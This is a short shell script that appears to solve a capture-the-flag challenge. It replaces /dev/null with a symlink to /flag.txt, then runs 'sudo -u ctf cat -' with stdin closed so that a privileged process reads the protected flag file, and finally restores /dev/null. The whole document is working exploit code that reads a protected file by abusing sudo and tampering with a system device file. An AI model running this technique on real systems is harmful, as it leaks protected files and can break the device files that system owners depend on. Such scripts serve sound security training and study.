#!/bin/sh
mv /dev/null /dev/null2
ln -s /flag.txt /dev/null 
sudo -u ctf cat - 0>&-
rm /dev/null
mv /dev/null2 /dev/null
# Just to get a newline at the end
echo 
